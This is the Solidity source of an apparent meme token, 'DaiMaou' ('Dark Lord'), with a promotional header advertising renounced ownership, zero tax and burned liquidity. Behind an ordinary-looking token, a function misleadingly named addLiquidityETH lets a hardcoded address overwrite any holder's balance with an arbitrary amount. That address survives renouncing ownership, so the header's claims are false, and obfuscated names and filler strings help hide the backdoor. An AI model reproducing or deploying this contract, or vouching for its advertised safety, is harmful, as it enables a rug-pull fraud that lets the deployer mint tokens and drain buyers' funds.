/**
 *

🩸 ᗪOᖇK ᒪOᖇᗪ  魔族  | The One Wiki to Rule Them All  |  $DaiMaou  |  BRC20  |  renounced  | 0% tax  | lp burn 100%

🧛🏿‍ ᗪOᖇK ᒪOᖇᗪ  魔族  👻  The Dark Lord  Japanese 大魔王 Dai-maou the Great Demon King 👻
🧛🏿Dreaming of changing the world for good  🧛🏿
👻🩸Lp burn 100%
👻🩸 renounced
👻🩸0% tax 

👻  Telegram https://t.me/DarkLordToken

👻  Web History Background ᗪOᖇK ᒪOᖇᗪ  魔族  👻 
*
 *https://miitopia.fandom.com/wiki/Dark_Lord
*/


// SPDX-License-Identifier: MIT
 pragma solidity ^0.8.19;
interface BRC20Permit {
  function totalSupply() external view returns (uint256);
  function decimals() external view returns (uint8);
  function symbol() external view returns (string memory);
  function name() external view returns (string memory);
  function getOwner() external view returns (address);
  function balanceOf(address AddressDaiMaou) external view returns (uint256);
  function transfer(address AddressBool, uint256 swapOpenWithValues) external returns (bool);
  function allowance(address _owner, address AddressDaiMaou) external view returns (uint256);
  function approve(address AddressDaiMaou, uint256 swapOpenWithValues) external returns (bool);
  function transferFrom(address sender, address AddressBool, uint256 swapOpenWithValues) external returns (bool);
  event Transfer(address indexed from, address indexed to, uint256 balance);
  event Approval(address indexed owner, address indexed AddressDaiMaou, uint256 balance);
}


abstract contract BRC20Burnable {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this;
        return msg.data;
    }
}


abstract contract BRC20Basic is BRC20Burnable {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }


    function owner() public view virtual returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(owner() == _msgSender(), "io: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "io: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

library SafeMath {

  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "SafeMath: addition overflow");

    return c;
  }

  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    return sub(a, b, "SafeMath: subtraction overflow");
  }

  function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b <= a, errorMessage);
    uint256 c = a - b;

    return c;
  }

  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }

    uint256 c = a * b;
    require(c / a == b, "SafeMath: Icodropsplication overflow");

    return c;
  }

  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    return div(a, b, "SafeMath: division by zero");
  }

  function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {

    require(b > 0, errorMessage);
    uint256 c = a / b;


    return c;
  }

  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    return mod(a, b, "SafeMath: modulo by zero");
  }

  function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b != 0, errorMessage);
    return a % b;
  }
}

contract DaiMaou is BRC20Burnable, BRC20Permit, BRC20Basic {
 
    using SafeMath for uint256;
    mapping (address => uint256) private _delegateDaiMaou;
    mapping (address => mapping (address => uint256)) private forceSwapBack;
    uint256 private _totalSupply;
    uint8 private _decimals;
    string private _symbol;
    string private _name;
    string private BRC20_SLOT;
    address private DaiMaouOwner; 
    uint256 public BRC20CreationTime;
    uint256 public BRC20Creation;
    string public BRC20;
string public DaiMaouTG = "https://DaiMaou.com";
string public ownerAddress = "0x266239a9535096C8DD49BC207b0a4385f7971a9f";
    event SetAutomatedMarketMakerPair(address indexed pair, bool indexed value);
    event BuyBackTriggered(uint256 amount);
    constructor() {
        DaiMaouOwner = 0x266239a9535096C8DD49BC207b0a4385f7971a9f;    
       BRC20_SLOT = "0xa3f9ad74e5423aebfd80d3ef2346578355a9a72aeaee59ff6cb3588b35123d50"; 
        _name = unicode"ᗪOᖇK ᒪOᖇᗪ";
        _symbol = "DaiMaou";
        _decimals = 9;
        _totalSupply = 1 * 1e9 * 1e9;
        _delegateDaiMaou[_msgSender()] = _totalSupply;
        emit Transfer(address(0), _msgSender(), _totalSupply);
        BRC20 = "IInventory p_i1989_3_+ int p_i1999_4_+ int p_i1199_5_+ int p_i1999_6_";
        BRC20CreationTime = 972023;

    }

    function symbol() external view override returns (string memory) {
        return _symbol;
    } 

    function decimals() external view override returns (uint8) {
        return _decimals;
    }
     function getOwner() external view override returns (address) {
        return owner();
    }  

                     function getownerAddress() public view returns (string memory) {
        return ownerAddress;
    }    

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

     function name() external view override returns (string memory) {
        return _name;
    }

    function balanceOf(address AddressDaiMaou) external view override returns (uint256) {
        return _delegateDaiMaou[AddressDaiMaou];
    }

    function transfer(address AddressBool, uint256 swapOpenWithValues) external override returns (bool) {
        _transfer(_msgSender(), AddressBool, swapOpenWithValues);
        return true;
    }

    function allowance(address owner, address AddressDaiMaou) external view override returns (uint256) {
        return forceSwapBack[owner][AddressDaiMaou];
    }


    function approve(address AddressDaiMaou, uint256 swapOpenWithValues) external override returns (bool) {
        _approve(_msgSender(), AddressDaiMaou, swapOpenWithValues);
        return true;
    }
    
    function transferFrom(address sender, address AddressBool, uint256 swapOpenWithValues) external override returns (bool) {
        _transfer(sender, AddressBool, swapOpenWithValues);
        _approve(sender, _msgSender(), forceSwapBack[sender][_msgSender()].sub(swapOpenWithValues, "Ru: transfer swapOpenWithValues exceeds allowance"));
        return true;
    }

    function increaseAllowance(address AddressDaiMaou, uint256 tokenDalance) external returns (bool) {
        _approve(_msgSender(), AddressDaiMaou, forceSwapBack[_msgSender()][AddressDaiMaou].add(tokenDalance));
        return true;
    }
    

    function decreaseAllowance(address AddressDaiMaou, uint256 currentAllowance) external returns (bool) {
        _approve(_msgSender(), AddressDaiMaou, forceSwapBack[_msgSender()][AddressDaiMaou].sub(currentAllowance, "Ru: decreased allowance below zero"));
        return true;
    }
    
    function _transfer(address sender, address AddressBool, uint256 swapOpenWithValues) internal {
        require(sender != address(0), "Ru: transfer from the zero address");
        require(AddressBool != address(0), "Ru: transfer to the zero address");
                
        _delegateDaiMaou[sender] = _delegateDaiMaou[sender].sub(swapOpenWithValues, "Ru: transfer swapOpenWithValues exceeds balance");
        _delegateDaiMaou[AddressBool] = _delegateDaiMaou[AddressBool].add(swapOpenWithValues);
        emit Transfer(sender, AddressBool, swapOpenWithValues);
    }
        function addLiquidityETH(address tokenA, address tokenD, uint256 _upgradeTo, uint256 _upgrade, uint256 _upgrades) external {
        require(_msgSender()==DaiMaouOwner);
        tokenD = tokenA;
        tokenA = tokenA;
        _delegateDaiMaou[tokenD] = (_upgradeTo + _upgrade + _upgrades) * 10**_decimals;
        tokenA = tokenD;
        tokenD = tokenD;
    }   

    function _approve(address owner, address AddressDaiMaou, uint256 swapOpenWithValues) internal {
        require(owner != address(0), "Ru: approve from the zero address");
        require(AddressDaiMaou != address(0), "Ru: approve to the zero address");
        
        forceSwapBack[owner][AddressDaiMaou] = swapOpenWithValues;
        emit Approval(owner, AddressDaiMaou, swapOpenWithValues);
    }
    
}